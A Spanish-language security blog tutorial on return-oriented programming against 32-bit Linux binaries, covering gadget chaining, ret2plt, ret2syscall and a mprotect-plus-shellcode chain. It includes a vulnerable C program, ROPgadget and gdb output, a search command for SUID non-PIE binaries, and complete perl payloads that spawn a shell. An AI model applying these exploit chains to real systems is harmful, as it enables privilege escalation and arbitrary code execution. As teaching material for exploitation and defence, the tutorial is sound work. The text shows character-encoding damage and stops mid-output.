---
layout: es/blog-detail
comments: true
title: "ROP: En el exploiting y en el amor todo vale"
date: 2018-07-09T11:39:00+00:00
categories:
    - Exploiting
tags:
    - 32 bit
    - 32 bit
    - msfelfscan
    - radare
    - ret2plt
    - rop
    - rop
    - ropgadget
    - ropper
    - ropper
    - stack
    - x86
image_src: /assets/uploads/2018/07/PuffinSecurity-ROP-En-el-exploiting-y-en-el-amor-todo-vale-e1563962724606.jpg
image_height: 300
image_width: 450
author: Yago Gutierrez
description: El post de hoy es prÃ¡cticamente una continuaciÃ³n del post anterior, ya que hoy traeremos la generalizaciÃ³n del ret2libc. Antes de empezar, dar una pequeÃ±a explicaciÃ³n de quÃ© es ASLR (Address Space Layout Randomization . Es un simple mÃ©todo de protecciÃ³n que aleatoriza el espacio...
publish_time: 2018-07-09T11:39:00+00:00
modified_time: 2019-02-19T14:32:49+00:00
comments_value: 0
disqus_identifier: 1735
---
El post de hoy es prÃ¡cticamente una continuaciÃ³n del [post anterior](/?p=621), ya que hoy traeremos la generalizaciÃ³n del ret2libc.

Antes de empezar, dar una pequeÃ±a explicaciÃ³n de quÃ© es ASLR (_Address Space Layout Randomization_ . Es un simple mÃ©todo de protecciÃ³n que aleatoriza el espacio de direcciones de los procesos. Si el ejecutable no es **PIE** (position independent executable, es decir, que estÃ© preparado para ejecutarse estando cargado en cualquier direcciÃ³n) no puede afectarle el ASLR, por lo que las secciones .text (cÃ³digo), .data, .bss, .got, .plt, etc (es decir, toda la informaciÃ³n que se encuentra en el binario y no pertenece al stack/heap) se cargarÃ¡n siempre en la misma direcciÃ³n, cosa que podemos aprovechar. Las librerÃ­as en linux siempre son PIE, por lo que siempre tienen ASLR, si es que estÃ¡ activado en el sistema/proceso. Mediante un comando como `cd /usr/bin ; file * | grep -i elf | grep -v -i pie | grep -i setuid` se pueden obtener los binarios con bit SUID activado que no son PIE.

Comencemos por un simple encadenamiento de funciones. El otro dÃ­a vimos cÃ³mo colocando en el stack datos simulando un `call` podemos ejecutar una funciÃ³n y encadenarle un exit(), funciÃ³n que al final no nos importa demasiado el argumento que reciba. Sin embargo, como ya hemos experimentado, suele ser necesario ejecutar un setuid(0) u alguna otra funciÃ³n, segÃºn necesidades y objetivos. Pongamos que deseamos llamar dos funciones cualquiera, la primera de 3 argumentos, y la segunda de 1 argumento. Cojamos el esquema que vimos en episodios anteriores para visualizar cÃ³mo lo harÃ­amos supuestamente.

|buf             |EBP(s)|EIP(s)     | EIP(s) para aaaaaa |  arg de aaaaaa()  |  arg de aaaaaa()  |  arg de aaaaaa()  |
+-----+-----  ---+------+-----------+--------------------+-------------------+-------------------+-------------------+
| ... |   Relleno       | &aaaaaa() |      &bbbbb()      |        ...        |        ...        |        ...        |
+-----+-----  ---+------+-----------+--------------------+-------------------+-------------------+-------------------+
â””ESP             â””EBP               â”” aaaaaa() recogerÃ¡                      |  arg de bbbbb()
                                      con su ret esto

El problema es bÃ¡sicamente que no tenemos dÃ³nde colocar el argumento para bbbbb(), de hecho, para ella (la funciÃ³n) su EIP(s) es el primer argumento de aaaaaa() (este problema no lo tenÃ­amos con exit() porque es de esas -funciones- que se van y nunca vuelven).  
La soluciÃ³n es mediante ROP (_Return Oriented Programming_), una tÃ©cnica que consiste en buscar (en el binario _et al_) instrucciones seguidas por un Â«retÂ» de forma que se puedan encadenar unas con otras, estos trozos de cÃ³digo se llaman _gadget_s. Los principales gadgets son del tipo `pop;ret`, ya que permiten recoger los argumentos usados por la funciÃ³n anterior, dejando asÃ­ el stack limpio para que la siguiente funciÃ³n recoja los argumentos apropiados. Para recoger los argumentos de aaaaaa() necesitamos un `pop;pop;pop;ret`, un `pop` por argumento. En ocasiones puedes encontrar un gadget `add esp, 0x?? ; ret`, no lo menosprecÃ©is, no deja de ser tan Ãºtil como uno de popâ€™s, y no serÃ­a raro que de hecho te salve la vida unas cuantas veces (no modifica valores de registros, a diferencia de los popâ€™s), el empleo de gadgets `add esp` se denomina _esp lifting_.  
El gadget lo aplicarÃ­amos asÃ­

|EIP(s)     | EIP(s) para aaaaaa |  arg de aaaaaa()  |  arg de aaaaaa()  |  arg de aaaaaa()  |          |     | arg de bbbbb()
+-----------+--------------------+-------------------+-------------------+-------------------+----------+-----+---------------+
| &aaaaaa() |  &pop;pop;pop;ret  |        ...        |        ...        |        ...        | &bbbbb() | ... |      ...      |
+-----------+--------------------+-------------------+-------------------+-------------------+----------+-----+---------------+
            â”” aaaaaa() recogerÃ¡
              con su ret esto

Tras la ejecuciÃ³n de aaaaaa() se recogerÃ¡ con ret la direcciÃ³n del gadget, que ejecutarÃ¡ 3 popâ€™s, recogiendo asÃ­ los tres argumentos de aaaaaa(), terminando con un ret que recogerÃ¡ en eip la direcciÃ³n de bbbbb() que tomarÃ¡ como argumento el situado 4 bytes mÃ¡s allÃ¡, siendo los bytes anteriores al argumento los que recogerÃ¡ el ret, colocando ahÃ­ un `pop;ret` permitirÃ­a encadenar otra funciÃ³n.

Funciones que puede ser interesante llamar son strcpy()/strncpy() o sprintf()/snprintf() o memcpy() (o incluso un gets() en caso de que el atacante controle el stdin, es muy cÃ³modo ya que solo requiere un argumento, pero si apuramos puede emplarse tambiÃ©n un read()) en un caso de stack con ASLR, para construir cadenas en secciones â€”que se encuentren en ese casoâ€” sin ASLR (como .data) a partir de bytes en el binario o en librerÃ­as (en caso de que estos no estÃ©n afectados por el ASLR â€”como un binario no PIE; en el caso de las librerÃ­as, es mÃ¡s bien en Windows donde puedes encontrar DLLs sin ASLRâ€”). Pongamos que queremos construir la cadena Â«/bin/shÂ» en .data, pero no la encontramos en el binario ni en sus librerÃ­as (o sus librerÃ­as tienen ASLR), y sin embargo encontramos en `0x0804aaaa` el carÃ¡cter Â«/Â», en `0x0804bbbb` la cadena Â«binÂ» y en `0x0804cccc` la cadena Â«shÂ»; con esto podemos arreglar algo tal que asÃ­:

`strncpy(.data, 0x0804aaaa, 1);  
strncpy(.data+1, 0x0804bbbb, 3);  
strncpy(.data+4, 0x0804aaaa, 1);  
strncpy(.data+5, 0x0804cccc, 2);`

Obteniendo en .data una cadena Â«/bin/shÂ» \[esto mismo se puede hacer tambiÃ©n si se encuentran gadgets del tipo `mov [reg], reg` \[vÃ©ase por ejemplo el funcionamiento de _[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)\]_. Controlando el stdin bastarÃ­a un gets(.data).

Otro comentario sobre ROPgadget. Muchas veces esta herramienta encuentra gadgets que ni aun revisando el cÃ³digo minuciosamente serÃ­as capaz de encontrar, esto se debe a que realiza la bÃºsqueda en funciÃ³n de unos opcodes. Una instrucciÃ³n tiene asociado un opcode, y aunque un binario no tenga una instrucciÃ³n como tal, es posible (y bastante probable) que, por casualidad, cuente con sus opcodes â€”hay que tener en cuenta que solo nos valen en la regiones ejecutablesâ€”.  
Teniendo en cuenta que `call eax` se traduce en `ffd0`  
`(gdb) disas main  
Dump of assembler code for function main:  
0x000004e9 <+0>: call 0x4fe <__x86.get_pc_thunk.ax>  
0x000004ee <+5>: add $0x1b12,%eax  
0x000004f3 <+10>: mov $0xaad0ffbb,%eax  
0x000004f8 <+15>: mov $0x0,%eax  
0x000004fd <+20>: ret  
End of assembler dump.  
(gdb) x/i 0x000004f3  
0x4f3 <main+10>: mov $0xaad0ffbb,%eax  
(gdb) x/i 0x000004f5  
0x4f5 <main+12>: call *%eax`

Se aprecia que en funciÃ³n de dÃ³nde interpretes que se encuentra el comienzo de una instrucciÃ³n se trata de una u otra.  
El procesador cuando ejecuta una instrucciÃ³n en una direcciÃ³n no sabe si Â«originalmenteÂ» esa direcciÃ³n estaba en medio de otra instrucciÃ³n, porque no es asÃ­, un binario no es mÃ¡s que una sucesiÃ³n de opcodes que tiene solo sentido si se inicia su lectura desde el comienzo. El procesador no distingue, a Ã©l le llegan opcodes y los ejecuta, no necesita mÃ¡s.  
Herramientas como [ropper](https://github.com/sashs/Ropper) o [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) automatizan la bÃºsqueda.

Continuemos por donde Ã­bamos  

    $ objdump -d vuln

vuln: formato del fichero elf32-i386  
\[â€¦\]  
804858d: 83 c4 0c add esp,0xc  
8048590: 5b pop ebx  
8048591: 5e pop esi  
8048592: 5f pop edi  
8048593: 5d pop ebp  
8048594: c3 ret

Bonito gadget eh, mÃ­ralo, quÃ© gordo y lustroso que estÃ¡.  

    $ objdump -x vuln

vuln: formato del fichero elf32-i386  
\[â€¦\]  
Secciones:  
Idx Name Size VMA LMA File off Algn  
\[â€¦\]  
23 .data 00000008 0804a018 0804a018 00001018 2\*\*2  
CONTENTS, ALLOC, LOAD, DATA

Ya tenemos direcciÃ³n donde escribir: 0x0804a018.  
`(gdb) p system  
$1 = {<text variable, no debug info>} 0xf7e01f80 <system>  
(gdb) p exit  
$2 = {<text variable, no debug info>} 0xf7df4f10 <exit>  
[...]  
$ objdump -d -j .plt vuln | grep strcpy  
08048370 <strcpy@plt>:`  
En libc.so.6 podemos encontrar de hecho una cadena /bin/sh, pero no queremos hacerlo asÃ­ de fÃ¡cil, Â¿verdad?  
Vamos a restringirnos solo a nuestro binario.  
Podemos emplear ROPgadget con la opciÃ³n `--string` para encontrar cadenas  
`$ python2.7 ROPgadget/ROPgadget.py --binary vuln --string /  
Strings information  
============================================================  
0x08048154 : /  
0x08048158 : /`

$ python2.7 ROPgadget/ROPgadget.py â€“binary vuln â€“string b  
Strings information  
\============================================================  
0x08048157 : b  
0x0804824f : b  
0x08048276 : b  
0x080482a6 : b  
0x080482cf : b

$ python2.7 ROPgadget/ROPgadget.py â€“binary vuln â€“string i  
Strings information  
\============================================================  
0x08048156 : i  
0x0804815d : i  
0x0804824e : i  
0x0804825e : i  
0x08048275 : i  
0x08048281 : i  
0x08048298 : i  
0x080482c1 : i  
0x080482f5 : i  
0x080482f6 : i

$ python2.7 ROPgadget/ROPgadget.py â€“binary vuln â€“string n  
Strings information  
\============================================================  
0x0804815e : n  
0x0804825f : n  
0x08048282 : n  
0x080482a2 : n  
0x080482af : n  
0x080482cb : n

$ python2.7 ROPgadget/ROPgadget.py â€“binary vuln â€“string bi  
Strings information  
\============================================================

$ python2.7 ROPgadget/ROPgadget.py â€“binary vuln â€“string in  
Strings information  
\============================================================  
0x0804815d : in  
0x0804825e : in  
0x08048281 : in

$ python2.7 ROPgadget/ROPgadget.py â€“binary vuln â€“string /b  
Strings information  
\============================================================

$ python2.7 ROPgadget/ROPgadget.py â€“binary vuln â€“string /s  
Strings information  
\============================================================

$ python2.7 ROPgadget/ROPgadget.py â€“binary vuln â€“string s  
Strings information  
\============================================================  
0x08048162 : s  
0x08048252 : s  
0x0804825b : s  
0x08048262 : s  
0x08048266 : s  
0x08048270 : s  
0x08048279 : s  
0x08048299 : s  
0x080482b1 : s  
0x080482c2 : s

$ python2.7 ROPgadget/ROPgadget.py â€“binary vuln â€“string sh  
Strings information  
\============================================================

$ python2.7 ROPgadget/ROPgadget.py â€“binary vuln â€“string h  
Strings information  
\============================================================  
0x0804866c : h  
Vale, pues emplearemos las direcciones en este orden: 0x08048154 (Â«/Â»), 0x08048157 (Â«bÂ»), 0x0804815d (Â«inÂ»), 0x08048154 (Â«/Â»), 0x08048162 (Â«sÂ»), 0x0804866c (Â«hÂ»).  
De todas formas, ROPgadget solo te muestra resultados terminados en Â» (porque le estamos pidiendo precisamente una string). En caso de no encontrar el byte necesario siempre se puede emplear xxd y encontrarlo fÃ¡cilmente (de esa forma obtienes el offset del byte en el archivo, luego tendrÃ¡s que sumarle al offset la direcciÃ³n en la que se carga el programa), sin embargo el tener todos los resultados terminados en Â» permite usar strcpy() en caso de no tener strncpy() o memcpy() \[si bien siempre puedes dejar que strcpy() te copie lo que quiera, que ya pararÃ¡ cuando encuentre un byte nulo, mientras la siguiente llamada a strcpy() sea justo tras el byte o bytes que interesaban, sirve perfectamente, puedes terminar la cadena con un strcpy() desde una posiciÃ³n donde se encuentre un byte nulo\].  
Pues a explotar se ha dicho  
``$ ./vuln `perl -e 'print  
> "A"x140 . # relleno  
> "x70x83x04x08" . # strcpy  
> "x92x85x04x08" . # pop;pop;ret  
> "x18xa0x04x08" . # .data  
> "x54x81x04x08" . # "/"  
> "x70x83x04x08" . # strcpy  
> "x92x85x04x08" . # pop;pop;ret  
> "x19xa0x04x08" . # .data+1  
> "x57x81x04x08" . # "b"  
> "x70x83x04x08" . # strcpy  
> "x92x85x04x08" . # pop;pop;ret  
> "x1axa0x04x08" . # .data+2  
> "x5dx81x04x08" . # "in"  
> "x70x83x04x08" . # strcpy  
> "x92x85x04x08" . # pop;pop;ret  
> "x1cxa0x04x08" . # .data+4  
> "x54x81x04x08" . # "/"  
> "x70x83x04x08" . # strcpy  
> "x92x85x04x08" . # pop;pop;ret  
> "x1dxa0x04x08" . # .data+5  
> "x62x81x04x08" . # "s"  
> "x70x83x04x08" . # strcpy  
> "x92x85x04x08" . # pop;pop;ret  
> "x1exa0x04x08" . # .data+6  
> "x6cx86x04x08" . # "h"  
> "x80x1fxe0xf7" . # system  
> "x10x4fxdfxf7" . # exit  
> "x18xa0x04x08"'` . # .data  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApï¿½ï¿½ï¿½ ï¿½Tï¿½pï¿½ï¿½ï¿½ ï¿½Wï¿½pï¿½ï¿½ï¿½ ï¿½]ï¿½pï¿½ï¿½ï¿½ ï¿½Tï¿½pï¿½ï¿½ï¿½ ï¿½bï¿½pï¿½ï¿½ï¿½ ï¿½lï¿½ï¿½ ï¿½ï¿½ Oï¿½ï¿½ ï¿½  
sh-4.4$``  
**\*pum\*** Satisface cuando un exploit funciona a la primera primeraâ€¦  
NÃ³tese que, mientras el ejecutable sea **no PIE, y en caso de obtener las direcciones de system() y exit() de otra manera, como la plt**, no importa si las librerÃ­as tienen ASLR activado; tampoco nos afecta el ASLR en el stack.

Sin embargo, la vida es hermosa y no siempre es posible hacer las cosas de este modo: en el caso del reto que puse ayer, al final del post, resulta que estabaâ€¦ difÃ­cil la cosa para ejecutar el setuid(0), ya que al estar explotando un strcpy() no podemos emplear bytes nulos [\[1\]](https://www.blogger.com/blogger.g?blogID=5766640353100096186&pli=1#asdfgh) (soluciÃ³n para el reto abajo). Otro posible problema serÃ­a que las librerÃ­as (o el binario en caso de ser PIE) se carguen en posiciones de memoria que comiencen por 0x00 (protecciÃ³n _ASCII Armored Address Space_, AAAS). En el caso de que el binario no estÃ© afectado por ASLR (por ser no-pie) o AAAS y las librerÃ­as sÃ­, ret2plt es una opciÃ³n: saltar a la entrada de dicha funciÃ³n en la secciÃ³n .plt del binario. La secciÃ³n .plt (_Procedure Linkage Table_) es una especie de Ã­ndice para los programas enlazados dinÃ¡micamente, de forma que al cargarse el programa en memoria, el enlazador (ld en sistemas Linux) situarÃ¡ en cada entrada de la plt la direcciÃ³n correspondiente a dicha funciÃ³n (solo en el caso de las funciones de librerÃ­a).  
Ejemplo  

    $ cat a.c
    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>

void asd() /\* Necesitamos usar una funciÃ³n para que gcc la  
Â«pidaÂ» al linker y por tanto se encuentre en  
la plt, y precisamente queremos tener estas  
funciones en la plt: system() y exit() \*/  
{  
system(NULL);  
exit(0);  
}

void imprimir(char\* arg)  
{  
char buf\[128\];  
strcpy(buf, arg);  
printf(Â«%snÂ», buf);  
}

int main(int argc, char\*\* argv)  
{  
if(argc < 2) return 1;  
imprimir(argv\[1\]);  
return 0;  
}

$ gcc a.c -o a -m32 -no-pie -fno-pie -fno-stack-protector -D\_FORTIFY\_SOURCE=0

$ objdump -d a -j .plt

a: formato del fichero elf32-i386

Desensamblado de la secciÃ³n .plt:

080483a0 <.plt>:  
80483a0: ff 35 04 a0 04 08 push DWORD PTR ds:0x804a004  
80483a6: ff 25 08 a0 04 08 jmp DWORD PTR ds:0x804a008  
80483ac: 00 00 add BYTE PTR \[eax\],al  
â€¦

080483b0 <strcpy@plt>:  
80483b0: ff 25 0c a0 04 08 jmp DWORD PTR ds:0x804a00c  
80483b6: 68 00 00 00 00 push 0x0  
80483bb: e9 e0 ff ff ff jmp 80483a0 <.plt>

080483c0 <puts@plt>:  
80483c0: ff 25 10 a0 04 08 jmp DWORD PTR ds:0x804a010  
80483c6: 68 08 00 00 00 push 0x8  
80483cb: e9 d0 ff ff ff jmp 80483a0 <.plt>

080483d0 <system@plt>:  
80483d0: ff 25 14 a0 04 08 jmp DWORD PTR ds:0x804a014  
80483d6: 68 10 00 00 00 push 0x10  
80483db: e9 c0 ff ff ff jmp 80483a0 <.plt>

080483e0 <exit@plt>:  
80483e0: ff 25 18 a0 04 08 jmp DWORD PTR ds:0x804a018  
80483e6: 68 18 00 00 00 push 0x18  
80483eb: e9 b0 ff ff ff jmp 80483a0 <.plt>

080483f0 <\_\_libc\_start\_main@plt>:  
80483f0: ff 25 1c a0 04 08 jmp DWORD PTR ds:0x804a01c  
80483f6: 68 20 00 00 00 push 0x20  
80483fb: e9 a0 ff ff ff jmp 80483a0 <.plt>

Encontramos que la dir de system() en la plt es `0x080483d0`. Vamoh a explotarlo (Marx meh).  
``$ ./a `perl -e 'print "A"x140 . "xd0x83x04x08" . "xe0x83x04x08" . "x6cxddxffxff"'`  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÐƒï¿½ï¿½lï¿½ï¿½ï¿½  
sh-4.4$``

PrÃ¡cticamente igual que emplear un ret2libc, solo que aquÃ­ no salimos de casa jaja. Ya entraremos mÃ¡s a fondo en el funcionamiento de la PLT y del lazy binding, asÃ­ como otras utilidades mÃ¡s profundas para el exploiting (sobrescritura de entradas de la GOT (_Global Offset Table_) y ret2dl-resolve).

En Ãºltimo tÃ©rmino, si no encontramos ninguna funciÃ³n Ãºtil en la plt podemos usar dos tÃ©cnicas, Â¿de cuÃ¡l prefieres que hablemos primero?â€¦Bueno empezaremos por esta.

**Ret2syscall**: en caso de tener gadgets que permitan colocar los valores necesarios en los registros, siempre se puede efectuar directamente una syscall sin necesidad de llamar a ninguna funciÃ³n (ROPgadget puede realizar un ropchain que emplea esta tÃ©cnica para ejecutar execve()). **En el solucionario ctf de hoy veremos un muy buen ejemplo, lectura obligada**.

La otra tÃ©cnica se conoce como _[**ret2dl-resolve**](http://phrack.org/issues/58/4.html),_ que mejor vamos a dedicarle un artÃ­culo para Ã©l.

Como ultimÃ­sima opciÃ³n se puede emplear una tÃ©cnica adicional: mediante la entrada en la plt de una funciÃ³n cualquiera, perteneciente a la misma librerÃ­a que la que nos interesa, podemos obtener la direcciÃ³n. Calculamos la diferencia entre las direcciones dentro de la librerÃ­a entre la funciÃ³n que encontramos en la plt y la funciÃ³n interesante. Esta diferencia la debemos sumar luego, _on runtime_ a la direcciÃ³n obtenida en la PLT. El problema es que no siempre es sencillo sumar una cantidad arbitraria mediante un ROP (en el solucionario ctf de hoy veremos un caso de suma arbitraria, nada muy complicado). Esto es sobre todo posible en la elevaciÃ³n de privilegios, ya que tenemos acceso a la librerÃ­a y no es necesario especular quÃ© versiÃ³n es y demÃ¡s molestias.  
Como apunte interesante: podemos aprovechar una propiedad de las funciones de librerÃ­a (bueno, y no solo las de librerÃ­a), y es que en numerosas ocasiones estÃ¡n precedidas por instrucciones inocuas como `xchg eax, eax` o `nop` (que al final se comporta en x86 como un `xchg eax, eax`). Estas instrucciones nos sirven como colchÃ³n de NOPs. Un colchÃ³n de NOPs es un conjunto de instrucciones NOP (como `nop` o `xchg eax, eax`) situados antes de un shellcode para aumentar las probabilidades de caer en una direcciÃ³n que lleve a la ejecuciÃ³n del shellcode, esto es un mÃ©todo que veremos cuando hablemos de ASLR, ya que solo tiene sentido en sistemas con ASLR activado, ya que sin ASLR, a no ser que sea un exploit remoto, conoces las direcciones del stack.  
Volvamos, estas instrucciones que preceden a las funciones de librerÃ­a nos facilitan que si no obtenemos una suma con la suficiente precisiÃ³n, aumentar el margen. Es, por decirlo de alguna manera, aumentar el nÃºmero de direcciones que nos sirven. TambiÃ©n sirve como soluciÃ³n en caso de que la direcciÃ³n de la librerÃ­a termine en 0x00 y no podamos introducirlo por el motivo que sea [\[1\]](https://www.blogger.com/blogger.g?blogID=5766640353100096186&pli=1#asdfgh).  

    (gdb) p strcpy
    $1 = {<text gnu-indirect-function variable, no debug info>} 0xf7e430d0 <strcpy_ifunc>
    (gdb) x/5i $1-9
       0xf7e430c7:  xchg   %ax,%ax
       0xf7e430c9:  xchg   %ax,%ax
       0xf7e430cb:  xchg   %ax,%ax
       0xf7e430cd:  xchg   %ax,%ax
       0xf7e430cf:  nop

Por otra parte, mencionar tambiÃ©n el falseo de frames (_frames faking_) como un mÃ©todo para encadenar funciones, y prometo una pronta entrega sobre ello en un artÃ­culo hablando sobre ataques al _base pointer_ (ebp), incluyendo el (al menos para mÃ­) gracioso _off-by-one_.

Continuemos por donde Ã­bamos . Ya hemos mencionado la importancia de instruccÃ­ones como `call eax` y `jmp esp`, pero no hemos hablado de en quÃ© son tan importantes. Una tÃ­pica opciÃ³n de explotaciÃ³n es ROP+shellcode. El ROP se emplearÃ­a para obtener permisos de ejecuciÃ³n donde sea necesario â€”eje_mprotect()_, _mmap_â€” (es posible que sea necesario copiar el shellcode a otra posiciÃ³n de memoria, especialmente si el stack/heap â€”sitios mÃ¡s comunes para nuestro payloadâ€” tiene ASLR, como .data) y el shellcodeâ€¦ pues harÃ­a cosas de shellcode.  
PractiquÃ©moslo. Necesitamos ejecutar primero un algo como `mprotect(0x.....000, 0x01010101, 0x00000007)`, el primer argumento es la direcciÃ³n a partir de la cual cambiar los permisos, debe terminar en un byte nulo â€”y el penÃºltimo byte debe tener el segundo nibble a 0, pero eso no afectaâ€” (para mantener la alineaciÃ³n con el tamaÃ±o de pÃ¡gina, que por lo general es de 4096, por si acaso, se puede comprobar con syscall()); el segundo parÃ¡metro indica cuÃ¡ntos bytes a partir de la direcciÃ³n se deben cambiar los permisos, ese nÃºmero (0x01010101) es el menor sin contener bytes nulos; y por Ãºltimo `PROT_EXEC|PROT_READ|PROT_READ` (y no, en la implementaciÃ³n que mi gcc emplea de mprotect no se permite en este argumento que aparezcan bits con valor 1 si no tienen un significado definido por el estÃ¡ndar, aunque veo que en la [implementaciÃ³n de mprotect para Mach](https://code.woboq.org/userspace/glibc/sysdeps/mach/mprotect.c.html) sÃ­ deberÃ­a funcionar, a no ser que la funciÃ³n `__vm_protect()` se lo cargue por dentro). Tenemos por tanto que situar varios bytes nulos [\[1\]](https://www.blogger.com/blogger.g?blogID=5766640353100096186&pli=1#asdfgh), lo que supone un problemilla. Podemos emplear una llamada a read() que escriba el ROP en el stack en el lugar preciso (al no tener ASLR esto es fÃ¡cil). Para hacer un read() en el stdin el primer argumento debe ser STDIN\_FILENO, que resulta que vale 0, otro problema. Sin embargo, tenemos la posibilidad de un ret2syscall. PodrÃ­amos hacer un mprotect con un ret2syscall, pero es mÃ¡s fÃ¡cil con un read(), que en el momento en que controlamos EIP el registro EBX tiene el valor 0x0, ademÃ¡s \_\_NR\_read vale 3, mientras que \_\_NR\_mprotect 125, asÃ­ que nuestro ganador es un ret2syscall a read() para leer un ROP ret2libc a mprotect() que termine con shellcode. Veamos quÃ© necesitamos para read()  
EAX -> 3  
EBX -> 0x0  
ECX -> 0xffffâ€¦. -> dime hora, que ya veremos dÃ³nde quedamos  
EDX -> cuÃ¡nto leer en bytes -> nos da iguÃ¡h

Veamos ahora quÃ© introduciremos para mprotect(). Sabiendo que nuestro buffer cae cerca de 0xffffd210, la pÃ¡gina de memoria correspondiente comienza en 0xffffd000 (`0xffffd210 & ~(0x00001000-1)` \[0x1000 = 409610\])

0xf7eb9240 0x........       0xffffd000 0x00010000 0x00000007 0x........  0xffffd210 0x........
&mprotect  &pop;pop;pop;ret                                  pop eax;ret &shellcode &call eax
                                                             o equiv.

Terminamos colocando en eax la direcciÃ³n del shellcode (&buf) para acabar de una vez con un `call eax`. Teniendo en cuenta que la segunda fase del payload (mprotect() + salto a shellcode) mide 32 bytes, respecto a la llamada a read(), nos basta que edx >= 32, ya que por mucho hambre que tenga read() y quiera comerse 4160342096 bytes (parece un nÃºmero aleatorio ), nosotros solo le pasamos 32 bytes, y solo va a leer los bytes que le pasemos. Resulta que en el punto en el que tomamos el timÃ³n del programa edx vale 0xf7f9c850 (ahora el nÃºmero de antes se entiende mejor), pues al ser un poquito mayor que 32 (un poquito ), nos vale. Pues empecemos buscando los gadgets que necesitamos. Hay que recordar tener cuidado con no modificarnos el ebx, para algo que nos dan hechoâ€¦

Â¿Necesitamos un `xor eax, eax`? ROPgadget nos lo da (por cierto, el comando `ldd` es algo indispensable para saber las librerÃ­as que usa un programa, y por tanto en quÃ© librerÃ­as podemos buscar gadgets, y tambiÃ©n para saber en quÃ© direcciÃ³n serÃ¡n cargadas para ese proceso).  
`$ python2.7 ROPgadget/ROPgadget.py --binary /usr/lib/ld-linux.so.2 --offset 0xf7fd6000 --badbytes 00 | grep "xor eax, eax"  
[...]  
0xf7fdbbd0 : xor eax, eax ; ret`

Â¿Que necesitas un `inc eax`? Toma guapx  
`$ python2.7 ROPgadget/ROPgadget.py --binary /usr/lib/ld-linux.so.2 --offset 0xf7fd6000 --badbytes 00 | grep "inc eax"  
[...]  
0xf7fd6cb3 : add al, 0x83 ; inc eax ; add al, 1 ; ret`  
Te traigo como plus el `add al, 1`, que me has caÃ­do bien.

Â¿Desean un `pop ecx`? Cuidado, que si no os lo encuentro en un lado, sÃ­ en otro.  
`$ python2.7 ROPgadget/ROPgadget.py --binary /usr/lib32/libc.so.6 --offset 0xf7dc4000 --badbytes 00 | grep "pop ecx"  
[...]  
0xf7e01e03 : pop ecx ; ret`

â€”Me apuesto un `int 0x80 ; ret` a que no lo haces.  
â€”Â¿Que no?  
\[â€¦\]  
â€”Venga.  
`$ python2 ROPgadget/ROPgadget.py --binary /lib/ld-linux.so.2 --badbytes 00 --offset 0xf7fd6000 --opcode "cd80c3"  
[...]  
0xf7fd6c30 : cd80c3`

Ya tenemos todo para el read(). Vamos ahora con los ingredientes para la segunda parte.

â€”Â¡UN `&mprotect` PARA LA MESA 2!  
â€”OÃ­do cocina.  
`$1 = {<text variable, no debug info>} 0xf7eb9240 <mprotect>`

â€”A ver, la lista de la compraâ€¦Â  `pop;pop;pop;ret`.  
`$ python2.7 ROPgadget/ROPgadget.py --binary /usr/lib32/libc.so.6 --offset 0xf7dc4000 --badbytes 00 --only "pop|pop|pop|ret"  
[...]  
0xf7e05fdb : pop ebx ; pop esi ; pop ebp ; ret`  
\[Ahora ya no nos importa modificar ebx, la syscall read() ya estÃ¡ hecha.\]

â€”Eh sÃ­, pÃ³ngame un whisky, poco hielo, con una rajita de limÃ³n, y una direcciÃ³n de `pop eax;ret`â€¦  
â€”En seguida traigo su whisky.  
`$ python2.7 ROPgadget/ROPgadget.py --binary /usr/lib32/libc.so.6 --offset 0xf7dc4000 --badbytes 00 | grep "pop eax"  
[...]  
0xf7de9be7 : pop eax ; ret`

â€”Â¿Quieres llamar de una vez a tu tÃ­a EAX para felicitarle el cumple?  
â€”Vaaaleeeâ€¦ pÃ¡same el tel.  
`$ python2.7 ROPgadget/ROPgadget.py --binary /usr/lib32/libc.so.6 --offset 0xf7dc4000 --badbytes 00 | grep "call eax"  
[...]  
0xf7dde182 : call eax`

Con todo podemos hacer un esqueleto del payload para obtener las direcciones que nos faltan.

Parte 1 (argumento):
0xf7fdbbd0 xor eax, eax ; ret
0xf7fd6cb5 inc eax ; add al, 1 ; ret
0xf7fd6cb6 add al, 1                  -> EAX = 3
0xf7e01e03 pop ecx ; ret             --> ECX = 0xffff???? -> todavÃ­a no sabemos dÃ³nde quedar
0xffff???? --                      --^    # Apunta a la posiciÃ³n justo despuÃ©s de la dir de `int 0x80;ret` 0xf7fd6c30 int 0x80 ; ret # EAX = 3 ; EBX = 0x0 ; ECX = 0xffff???? ; EDX = da iguÃ¡

Parte 2 (stdin) \[colocada en 0xffff????\]:  
0xf7eb9240 &mprotect  
0xf7e05fdb &pop;pop;pop;ret  
0xffffd000  
0x00010000  
0x00000007  
0xf7de9be7 &pop eax;ret  
0xffffÂ¿Â¿Â¿Â¿ # Con Â«Â¿Â» para diferenciar del valor que ponemos en ecx antes, este apunta al shellcode  
0xf7dde182 call eax

Ahora calculemos en quÃ© direcciÃ³n leer.  
```$ ltrace /home/arget/vuln "`cat sc.o``perl -e 'print "A"x(140-33) . "xd0xbbxfdxf7" . "xb5x6cxfdxf7" . "xb6x6cxfdxf7" . "x03x1exe0xf7" . "xaaxaaxffxff" . "x30x6cxfdxf7"'`"  
__libc_start_main(0x80484f5, 2, 0xffffd354, 0x8048540 <unfinished ...>  
strcpy(0xffffd200, "130026032513333152001300Ph//shh/bin211343PS211341260v1322315"...) = 0xffffd200  
puts("130026032513333152001300Ph//shh/bin211343PS211341260v1322315"...1ï¿½ï¿½ï¿½1ï¿½Í€1ï¿½Ph//shh/binï¿½ï¿½PSï¿½ï¿½ï¿½  
